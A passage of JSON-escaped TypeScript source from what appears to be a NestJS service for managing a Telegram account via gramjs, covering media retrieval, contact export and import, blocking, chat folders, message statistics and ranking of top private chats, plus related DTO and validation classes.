      return {\n                id: message.id,\n                message: message.message,\n                date: message.date,\n                sender: {\n                    id: message.senderId?.toString(),\n                    is_self: message.out,\n                    username: message.fromId ? message.fromId.toString() : null,\n                },\n                media,\n            };\n        }));\n\n        return {\n            messages: processedMessages,\n            total: ('count' in result ? result.count : messages.length) || messages.length\n        };\n    }\n\n    async getFilteredMedia(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        offset?: number;\n        limit?: number;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, types = ['photo', 'video'], startDate, endDate, offset = 0, limit = 50, maxId, minId } = params;\n\n        const query: Partial<IterMessagesParams> = {\n            offsetId: offset,\n            limit: limit || 500,\n            ...(maxId ? { maxId } : {}),\n            ...(minId ? { minId } : {}),\n            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),\n            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })\n        };\n\n        const ent = await this.safeGetEntity(chatId);\n\n        const messages = await this.client.getMessages(ent, query);\n        const filteredMessages = messages.filter(message => {\n            if (!message.media) return false;\n            const mediaType = this.getMediaType(message.media);\n            return types.includes(mediaType);\n        });\n\n        const mediaData = await Promise.all(filteredMessages.map(async (message: Api.Message) => {\n            let thumbBuffer = null;\n\n            try {\n                if (message.media instanceof Api.MessageMediaPhoto) {\n                    const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n                    thumbBuffer = await this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                } else if (message.media instanceof Api.MessageMediaDocument) {\n                    const sizes = message.document?.thumbs || [1];\n                    thumbBuffer = await this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                }\n            } catch (error) {\n                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);\n            }\n\n            const mediaDetails = await this.getMediaDetails(message.media as Api.MessageMediaDocument);\n\n            return {\n                messageId: message.id,\n                type: this.getMediaType(message.media),\n                thumb: thumbBuffer?.toString('base64') || null,\n                caption: message.message || '',\n                date: message.date,\n                mediaDetails,\n            };\n        }));\n\n        return {\n            messages: mediaData,\n            total: messages.total,\n            hasMore: messages.length === limit\n        };\n    }\n\n    async safeGetEntity(entityId: string): Promise<Api.TypeUser | Api.TypeChat | Api.PeerChannel | null> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        try {\n            // First attempt: direct getEntity\n            return await this.client.getEntity(entityId);\n        } catch (error) {\n            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);\n\n            try {\n                // Second attempt: search through dialogs\n                const dialogs = await this.client.getDialogs({\n                    limit: 300 // Adjust limit as needed\n                });\n\n                // Search through dialog entities\n                for (const dialog of dialogs) {\n                    const entity = dialog.entity;\n                    if (entity.id.toString() === entityId.toString()) {\n                        return entity;\n                    }\n                }\n\n                console.log(`Entity ${entityId} not found in dialogs either`);\n                return null;\n            } catch (dialogError) {\n                console.error('Error while searching dialogs:', dialogError);\n                return null;\n            }\n        }\n    }\n\n    // Contact Management Features\n    private generateCSV(contacts: Array<{ firstName: string, lastName: string, phone: string, blocked: boolean }>) {\n        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');\n        const rows = contacts.map(contact => [\n            contact.firstName,\n            contact.lastName,\n            contact.phone,\n            contact.blocked\n        ].join(','));\n\n        return [header, ...rows].join('\\n');\n    }\n\n    private generateVCard(contacts: any[]) {\n        return contacts.map(contact => {\n            const vcard = [\n                'BEGIN:VCARD',\n                'VERSION:3.0',\n                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),\n                `TEL;TYPE=CELL:${contact.phone || ''}`,\n                'END:VCARD'\n            ];\n            return vcard.join('\\n');\n        }).join('\\n\\n');\n    }\n\n    async exportContacts(format: 'vcard' | 'csv', includeBlocked: boolean = false) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        let blockedContacts;\n        if (includeBlocked) {\n            blockedContacts = await this.client.invoke(new Api.contacts.GetBlocked({\n                offset: 0,\n                limit: 100\n            }));\n        }\n\n        if (format === 'csv') {\n            const csvData = contacts.map((contact: any) => ({\n                firstName: contact.firstName || '',\n                lastName: contact.lastName || '',\n                phone: contact.phone || '',\n                blocked: blockedContacts ? blockedContacts.peers.some((p: any) =>\n                    p.id.toString() === contact.id.toString()\n                ) : false\n            }));\n            return this.generateCSV(csvData);\n        } else {\n            return this.generateVCard(contacts);\n        }\n    }\n\n    async importContacts(data: { firstName: string; lastName?: string; phone: string }[]) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(data.map(async contact => {\n            try {\n                await this.client.invoke(new Api.contacts.ImportContacts({\n                    contacts: [new Api.InputPhoneContact({\n                        clientId: bigInt(Math.floor(Math.random() * 1000000)),\n                        phone: contact.phone,\n                        firstName: contact.firstName,\n                        lastName: contact.lastName || ''\n                    })]\n                }));\n                return { success: true, phone: contact.phone };\n            } catch (error) {\n                return { success: false, phone: contact.phone, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async manageBlockList(userIds: string[], block: boolean) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(userIds.map(async userId => {\n            try {\n                if (block) {\n                    await this.client.invoke(new Api.contacts.Block({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                } else {\n                    await this.client.invoke(new Api.contacts.Unblock({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                }\n                return { success: true, userId };\n            } catch (error) {\n                return { success: false, userId, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async getContactStatistics() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        const onlineContacts = contacts.filter((c: any) => c.status && 'wasOnline' in c.status);\n\n        return {\n            total: contacts.length,\n            online: onlineContacts.length,\n            withPhone: contacts.filter((c: any) => c.phone).length,\n            mutual: contacts.filter((c: any) => c.mutual).length,\n            lastWeekActive: onlineContacts.filter((c: any) => {\n                const lastSeen = new Date(c.status.wasOnline * 1000);\n                const weekAgo = new Date();\n                weekAgo.setDate(weekAgo.getDate() - 7);\n                return lastSeen > weekAgo;\n            }).length\n        };\n    }\n\n    // Chat Folder Management\n    async createChatFolder(options: {\n        name: string,\n        includedChats: string[],\n        excludedChats?: string[],\n        includeContacts?: boolean,\n        includeNonContacts?: boolean,\n        includeGroups?: boolean,\n        includeBroadcasts?: boolean,\n        includeBots?: boolean,\n        excludeMuted?: boolean,\n        excludeRead?: boolean,\n        excludeArchived?: boolean\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const folder = new Api.DialogFilter({\n            id: Math.floor(Math.random() * 1000),\n            title: options.name,\n            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),\n            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),\n            pinnedPeers: [],\n            contacts: options.includeContacts ?? true,\n            nonContacts: options.includeNonContacts ?? true,\n            groups: options.includeGroups ?? true,\n            broadcasts: options.includeBroadcasts ?? true,\n            bots: options.includeBots ?? true,\n            excludeMuted: options.excludeMuted ?? false,\n            excludeRead: options.excludeRead ?? false,\n            excludeArchived: options.excludeArchived ?? false\n        });\n\n        await this.client.invoke(new Api.messages.UpdateDialogFilter({\n            id: folder.id,\n            filter: folder\n        }));\n\n        return {\n            id: folder.id,\n            name: options.name,\n            options: {\n                includeContacts: folder.contacts,\n                includeNonContacts: folder.nonContacts,\n                includeGroups: folder.groups,\n                includeBroadcasts: folder.broadcasts,\n                includeBots: folder.bots,\n                excludeMuted: folder.excludeMuted,\n                excludeRead: folder.excludeRead,\n                excludeArchived: folder.excludeArchived\n            }\n        };\n    }\n\n    async getChatFolders() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const filters = await this.client.invoke(new Api.messages.GetDialogFilters());\n        return filters.map((filter: any) => ({\n            id: filter.id ?? 0,\n            title: filter.title ?? '',\n            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,\n            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0\n        }));\n    }\n\n    async sendMediaBatch(options: {\n        chatId: string;\n        media: Array<{\n            type: 'photo' | 'video' | 'document';\n            url: string;\n            caption?: string;\n            fileName?: string;\n        }>;\n        silent?: boolean;\n        scheduleDate?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            options.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const file = new CustomFile(\n                    item.fileName || `media.${this.getMediaExtension(item.type)}`,\n                    buffer.length,\n                    'media',\n                    buffer\n                );\n\n                const uploadedFile = await this.client.uploadFile({\n                    file,\n                    workers: 1\n                });\n\n                const inputMedia = item.type === 'photo' ?\n                    new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                    new Api.InputMediaUploadedDocument({\n                        file: uploadedFile,\n                        mimeType: this.getMimeType(item.type),\n                        attributes: this.getMediaAttributes(item)\n                    });\n\n                return new Api.InputSingleMedia({\n                    media: inputMedia,\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: options.chatId,\n            multiMedia: mediaFiles,\n            silent: options.silent,\n            scheduleDate: options.scheduleDate\n        }));\n    }\n\n    private getMimeType(type: string): string {\n        switch (type) {\n            case 'photo': return 'image/jpeg';\n            case 'video': return 'video/mp4';\n            case 'document': return 'application/octet-stream';\n            default: return 'application/octet-stream';\n        }\n    }\n\n    private getMediaAttributes(item: { type: string, fileName?: string }): Api.TypeDocumentAttribute[] {\n        const attributes: Api.TypeDocumentAttribute[] = [];\n\n        if (item.fileName) {\n            attributes.push(new Api.DocumentAttributeFilename({\n                fileName: item.fileName\n            }));\n        }\n\n        if (item.type === 'video') {\n            attributes.push(new Api.DocumentAttributeVideo({\n                duration: 0,\n                w: 1280,\n                h: 720,\n                supportsStreaming: true\n            }));\n        }\n\n        return attributes;\n    }\n\n    async editMessage(options: {\n        chatId: string;\n        messageId: number;\n        text?: string;\n        media?: {\n            type: 'photo' | 'video' | 'document';\n            url: string;\n        };\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.media) {\n            const buffer = await this.downloadFileFromUrl(options.media.url);\n            const file = new CustomFile(\n                `media.${this.getMediaExtension(options.media.type)}`,\n                buffer.length,\n                'media',\n                buffer\n            );\n\n            const uploadedFile = await this.client.uploadFile({\n                file,\n                workers: 1\n            });\n\n            const inputMedia = options.media.type === 'photo' ?\n                new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                new Api.InputMediaUploadedDocument({\n                    file: uploadedFile,\n                    mimeType: this.getMimeType(options.media.type),\n                    attributes: this.getMediaAttributes(options.media)\n                });\n\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                media: inputMedia,\n                message: options.text || ''\n            }));\n        }\n\n        if (options.text) {\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                message: options.text\n            }));\n        }\n\n        throw new Error('Either text or media must be provided');\n    }\n\n    async getChats(options: {\n        limit?: number;\n        offsetDate?: number;\n        offsetId?: number;\n        offsetPeer?: string;\n        folderId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const dialogs = await this.client.getDialogs({\n            ...options,\n            limit: options.limit || 100\n        });\n\n        return Promise.all(dialogs.map(async (dialog) => {\n            const entity = dialog.entity;\n            return {\n                id: entity.id.toString(),\n                title: 'title' in entity ? entity.title : null,\n                username: 'username' in entity ? entity.username : null,\n                type: entity instanceof Api.User ? 'user' :\n                    entity instanceof Api.Chat ? 'group' :\n                        entity instanceof Api.Channel ? 'channel' : 'unknown',\n                unreadCount: dialog.unreadCount,\n                lastMessage: dialog.message ? {\n                    id: dialog.message.id,\n                    text: dialog.message.message,\n                    date: new Date(dialog.message.date * 1000)\n                } : null\n            };\n        }));\n    }\n\n    async updateChatSettings(settings: {\n        chatId: string;\n        title?: string;\n        about?: string;\n        photo?: string;\n        slowMode?: number;\n        linkedChat?: string;\n        defaultSendAs?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const chat = await this.client.getEntity(settings.chatId);\n\n        const updates: Promise<any>[] = [];\n\n        if (settings.title) {\n            updates.push(this.client.invoke(new Api.channels.EditTitle({\n                channel: chat,\n                title: settings.title\n            })));\n        }\n\n        if (settings.about) {\n            updates.push(this.client.invoke(new Api.messages.EditChatAbout({\n                peer: chat,\n                about: settings.about\n            })));\n        }\n\n        if (settings.photo) {\n            const buffer = await this.downloadFileFromUrl(settings.photo);\n            const file = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            updates.push(this.client.invoke(new Api.channels.EditPhoto({\n                channel: chat,\n                photo: new Api.InputChatUploadedPhoto({\n                    file: file\n                })\n            })));\n        }\n\n        if (settings.slowMode !== undefined) {\n            updates.push(this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: chat,\n                seconds: settings.slowMode\n            })));\n        }\n\n        if (settings.linkedChat) {\n            const linkedChannel = await this.client.getEntity(settings.linkedChat);\n            updates.push(this.client.invoke(new Api.channels.SetDiscussionGroup({\n                broadcast: chat,\n                group: linkedChannel\n            })));\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getMessageStats(options: {\n        chatId: string;\n        period: 'day' | 'week' | 'month';\n        fromDate?: Date;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = options.fromDate || new Date();\n        const startDate = new Date(now);\n\n        switch (options.period) {\n            case 'day':\n                startDate.setDate(startDate.getDate() - 1);\n                break;\n            case 'week':\n                startDate.setDate(startDate.getDate() - 7);\n                break;\n            case 'month':\n                startDate.setMonth(startDate.getMonth() - 1);\n                break;\n        }\n\n        const messages = await this.client.getMessages(options.chatId, {\n            limit: 100,\n            offsetDate: Math.floor(now.getTime() / 1000),\n        });\n\n        const stats = {\n            total: messages.length,\n            withMedia: 0,\n            withLinks: 0,\n            withForwards: 0,\n            byHour: new Array(24).fill(0),\n            byType: {\n                text: 0,\n                photo: 0,\n                video: 0,\n                document: 0,\n                other: 0\n            }\n        };\n\n        for (const msg of messages) {\n            const hour = new Date(msg.date * 1000).getHours();\n            stats.byHour[hour]++;\n\n            if (msg.media) {\n                stats.withMedia++;\n                const mediaType = this.getMediaType(msg.media);\n                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;\n            } else if (msg.message) {\n                if (msg.message.match(/https?:\\/\\/[^\\s]+/)) {\n                    stats.withLinks++;\n                }\n                stats.byType.text++;\n            }\n\n            if (msg.fwdFrom) {\n                stats.withForwards++;\n            }\n        }\n\n        return stats;\n    }\n\n    async getTopPrivateChats(): Promise<Array<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        console.log('Starting getTopPrivateChats analysis...');\n        const startTime = Date.now();\n\n        // Weighting factors for different interaction types\n        const weights = {\n            videoCall: 15,      // Video calls have highest weight due to high engagement\n            audioCall: 8,       // Audio calls indicate strong connection\n            sharedVideo: 6,     // Videos show high interaction intent\n            sharedPhoto: 4,     // Photos show moderate interaction\n            textMessage: 1,     // Base weight for messages\n            recentActivityBonus: 1.5  // Bonus multiplier for recent activity\n        };\n\n        console.log('Fetching dialogs...');\n        const dialogs = await this.client.getDialogs({\n            limit: 200 // Reduced from 500 for better performance\n        });\n        console.log(`Found ${dialogs.length} total dialogs`);\n\n        // Filter private chats more strictly\n        const privateChats = dialogs.filter(dialog =>\n            dialog.isUser &&\n            dialog.entity instanceof Api.User &&\n            !dialog.entity.bot && // Explicitly exclude bots\n            !dialog.entity.deleted && // Exclude deleted accounts\n            !dialog.entity.fake && // Exclude fake accounts\n            dialog.entity.id.toString() !== \"777000\" && // Exclude Telegram's service notifications\n            dialog.entity.id.toString() !== \"42777\" // Exclude Telegram's support account\n        );\n\n        console.log(`Found ${privateChats.length} valid private chats after filtering`);\n\n        // Calculate recent activity window (last month)\n        const now = Math.floor(Date.now() / 1000);\n        // const oneMonthAgo = now - (30 * 24 * 60 * 60);\n\n        // Process chats in batches to avoid overwhelming the API\n        const batchSize = 10;\n        const chatStats = [];\n\n        for (let i = 0; i < privateChats.length; i += batchSize) {\n            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);\n            const batch = privateChats.slice(i, i + batchSize);\n\n            const batchResults = await Promise.all(batch.map(async (dialog) => {\n                const processingStart = Date.now();\n                const chatId = dialog.entity.id.toString();\n                const user = dialog.entity as Api.User;\n\n                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'})`);\n\n                try {\n                    // Get recent messages with optimization\n                    const messages = await this.client.getMessages(chatId, {\n                        limit: 500,\n                        // offsetDate: oneMonthAgo\n                    });\n\n                    // Skip chats with fewer than 20 messages\n                    if (messages.length < 20) {\n                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length})`);\n                        return null;\n                    }\n\n                    console.log(`Retrieved ${messages.length} messages for chat ${chatId}`);\n\n                    const callStats = {\n                        total: 0,\n                        incoming: { total: 0, audio: 0, video: 0 },\n                        outgoing: { total: 0, audio: 0, video: 0 }\n                    };\n\n                    const mediaStats = { photos: 0, videos: 0 };\n                    let recentActivityScore = 0;\n\n                    // Optimize message processing with a single loop\n                    for (const message of messages) {\n                        const messageAge = now - message.date;\n                        const recencyMultiplier = 1 + (1 - messageAge / (30 * 24 * 60 * 60));\n\n                        if (message.action instanceof Api.MessageActionPhoneCall) {\n                            const call = message.action;\n                            callStats.total++;\n\n                            if (message.out) {\n                                callStats.outgoing.total++;\n                                call.video ? callStats.outgoing.video++ : callStats.outgoing.audio++;\n                            } else {\n                                callStats.incoming.total++;\n                                call.video ? callStats.incoming.video++ : callStats.incoming.audio++;\n                            }\n                        }\n\n                        if (message.media) {\n                            if (message.media instanceof Api.MessageMediaPhoto) {\n                                mediaStats.photos++;\n                            } else if (message.media instanceof Api.MessageMediaDocument &&\n                                message.media.document instanceof Api.Document &&\n                                message.media.document.mimeType?.startsWith('video/')) {\n                                mediaStats.videos++;\n                            }\n                        }\n\n                        recentActivityScore += recencyMultiplier;\n                    }\n\n                    // Calculate scores\n                    const interactionScore = (\n                        (callStats.incoming.video + callStats.outgoing.video) * weights.videoCall +\n                        (callStats.incoming.audio + callStats.outgoing.audio) * weights.audioCall +\n                        mediaStats.videos * weights.sharedVideo +\n                        mediaStats.photos * weights.sharedPhoto +\n                        messages.length * weights.textMessage\n                    ) * (recentActivityScore * weights.recentActivityBonus);\n\n                    // Calculate activity breakdown\n                    const activityBreakdown = {\n                        videoCalls: ((callStats.incoming.video + callStats.outgoing.video) * weights.videoCall) / interactionScore * 100,\n                        audioCalls: ((callStats.incoming.audio + callStats.outgoing.audio) * weights.audioCall) / interactionScore * 100,\n                        mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,\n                        textMessages: (messages.length * weights.textMessage) / interactionScore * 100\n                    };\n\n                    const processingTime = Date.now() - processingStart;\n                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);\n\n                    return {\n                        chatId,\n                        username: user.username,\n                        firstName: user.firstName,\n                        lastName: user.lastName,\n                        totalMessages: messages.length,\n                        interactionScore: Math.round(interactionScore * 100) / 100,\n                        calls: callStats,\n                        media: mediaStats,\n                        activityBreakdown\n                    };\n                } catch (error) {\n                    console.error(`Error processing chat ${chatId}:`, error);\n                    return null;\n                }\n            }));\n\n            chatStats.push(...batchResults.filter(Boolean));\n        }\n\n        // Sort by interaction score and get top 5\n        const topChats = chatStats\n            .sort((a, b) => b.interactionScore - a.interactionScore)\n            .slice(0, 5);\n\n        const totalTime = Date.now() - startTime;\n        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);\n        topChats.forEach((chat, index) => {\n            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);\n        });\n\n        return topChats;\n    }\n}\nexport default TelegramManager;\n","import { Injectable } from '@nestjs/common';\r\n\r\n@Injectable()\r\nexport class TelegramValidationConfig {\r\n    static readonly PHONE_PATTERN = /^\\+?[1-9]\\d{1,14}$/;\r\n    static readonly USERNAME_PATTERN = /^[a-zA-Z0-9_]{5,32}$/;\r\n    static readonly MESSAGE_MAX_LENGTH = 4096;\r\n    static readonly CAPTION_MAX_LENGTH = 1024;\r\n    static readonly FILE_SIZE_LIMIT = 2000 * 1024 * 1024; // 2000MB\r\n    static readonly BATCH_SIZE_LIMIT = 100;\r\n    \r\n    static readonly ALLOWED_MEDIA_TYPES = [\r\n        'photo',\r\n        'video',\r\n        'document',\r\n        'voice',\r\n        'audio'\r\n    ];\r\n\r\n    static readonly ALLOWED_PRIVACY_LEVELS = [\r\n        'everybody',\r\n        'contacts',\r\n        'nobody'\r\n    ];\r\n\r\n    static readonly MESSAGE_TYPES = [\r\n        'all',\r\n        'text',\r\n        'photo',\r\n        'video',\r\n        'voice',\r\n        'document'\r\n    ];\r\n\r\n    static readonly DEFAULT_PAGINATION = {\r\n        limit: 20,\r\n        maxLimit: 100\r\n    };\r\n}","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, ArrayMinSize, ArrayMaxSize } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\n\r\nexport enum BatchOperationType {\r\n  FORWARD = 'forward',\r\n  DELETE = 'delete',\r\n  EDIT = 'edit'\r\n}\r\n\r\n// Base class for batch operations\r\nexport class BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Chat ID for the operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class BatchItemDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message ID for message operations', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n\r\n  @ApiProperty({ description: 'Source chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  fromChatId?: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  toChatId?: string;\r\n}\r\n\r\nexport class BatchProcessDto {\r\n  @ApiProperty({ description: 'Operation type', enum: BatchOperationType })\r\n  @IsEnum(BatchOperationType)\r\n  operation: BatchOperationType;\r\n\r\n  @ApiProperty({ description: 'Items to process', type: [BatchItemDto] })\r\n  @IsArray()\r\n  items: BatchItemDto[];\r\n\r\n  @ApiProperty({ description: 'Number of items to process in each batch', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  batchSize?: number = 20;\r\n  @ApiProperty({ description: 'Delay between batches in milliseconds', default: 1000 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  delayMs?: number = 1000;\r\n}\r\n\r\nexport class ForwardBatchDto {\r\n  @ApiProperty({ description: 'Source chat ID for forwarding' })\r\n  @IsString()\r\n  fromChatId: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forwarding' })\r\n  @IsString()\r\n  toChatId: string;\r\n\r\n  @ApiProperty({ description: 'Message IDs to forward', type: [Number] })\r\n  @IsArray()\r\n  @ArrayMinSize(1, { message: 'At least one message ID is required' })\r\n  @ArrayMaxSize(100, { message: 'Cannot forward more than 100 messages at once' })\r\n  @IsNumber({}, { each: true })\r\n  @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n  messageIds: number[];\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class ConnectionStatusDto {\r\n  @ApiProperty({ description: 'Number of active connections' })\r\n  activeConnections: number;\r\n\r\n  @ApiProperty({ description: 'Number of rate-limited connections' })\r\n  rateLimited: number;\r\n\r\n  @ApiProperty({ description: 'Total number of operations' })\r\n  totalOperations: number;\r\n}\r\nexport class ChatStatisticsDto {\r\n  @ApiProperty({ description: 'Total message count' })\r\n  totalMessages: number;\r\n\r\n  @ApiProperty({ description: 'Active member count' })\r\n  activeMembers: number;\r\n\r\n  @ApiProperty({ description: 'Message count by type' })\r\n  messageTypes: {\r\n    text: number;\r\n    photo: number;\r\n    video: number;\r\n    voice: number;\r\n    document: number;\r\n  };\r\n\r\n  @ApiProperty({ description: 'Most active hours', type: [Number] })\r\n  activeHours: number[];\r\n\r\n  @ApiProperty({ description: 'Activity trend percentage' })\r\n  activityTrend: number;\r\n}","import { IsString, IsOptional, IsArray, IsBoolean, IsEnum } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport type ExportFormat = 'vcard' | 'csv';\r\n\r\nexport class ContactGroupDto {\r\n  @ApiProperty({ description: 'Name of the contact group' })\r\n  @IsString()\r\n  name: string;\r\n\r\n  @ApiProperty({ description: 'User IDs to include in the group', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Optional description for the group' })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n}\r\n\r\nexport class ContactBlockListDto {\r\n  @ApiProperty({ description: 'User IDs to block/unblock', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Whether to block or unblock the users' })\r\n  @IsBoolean()\r\n  block: boolean;\r\n}\r\n\r\nexport class ContactExportImportDto {\r\n  @ApiProperty({ enum: ['vcard', 'csv'], description: 'Export format type' })\r\n  @IsEnum(['vcard', 'csv'] as const)\r\n  format: ExportFormat;\r\n\r\n  @ApiProperty({ description: 'Whether to include blocked contacts', required: false, default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  includeBlocked = false;\r\n}\r\n\r\nexport class ContactImportDto {\r\n  @ApiProperty({ description: 'Contacts to import', type: [Object] })\r\n  @IsArray()\r\n  contacts: Array<{\r\n    firstName: string;\r\n    lastName?: string;\r\n    phone: string;\r\n  }>;\r\n}\r\n\r\nexport class AddContactsDto {\r\n  @ApiProperty({ description: 'Phone numbers to add', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  phoneNumbers: string[];\r\n\r\n  @ApiProperty({ description: 'Name prefix to use for added contacts' })\r\n  @IsString()\r\n  prefix: string;\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsArray, IsBoolean, IsNotEmpty, IsOptional, IsString } from 'class-validator';\r\n\r\nexport class CreateChatFolderDto {\r\n    @ApiProperty({ description: 'Name of the chat folder' })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    name: string;\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to include in the folder' })\r\n    @IsArray()\r\n    @IsNotEmpty()\r\n    includedChats: string[];\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to exclude from the folder', required: false })\r\n    @IsArray()\r\n    @IsOptional()\r\n    excludedChats?: string[];\r\n\r\n    @ApiProperty({ description: 'Include contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include non-contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeNonContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include groups in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeGroups?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include broadcast channels in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBroadcasts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include bots in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBots?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude muted chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeMuted?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude read chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeRead?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude archived chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeArchived?: boolean;\r\n}","import { IsString, IsOptional, IsNumber, IsBoolean, IsObject, ValidateNested, IsNotEmpty, IsEnum, IsDateString } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Type, Transform } from 'class-transformer';\r\n\r\nexport enum AdminPermission {\r\n  CHANGE_INFO = 'changeInfo',\r\n  POST_MESSAGES = 'postMessages',\r\n  EDIT_MESSAGES = 'editMessages',\r\n  DELETE_MESSAGES = 'deleteMessages',\r\n  BAN_USERS = 'banUsers',\r\n  INVITE_USERS = 'inviteUsers',\r\n  PIN_MESSAGES = 'pinMessages',\r\n  ADD_ADMINS 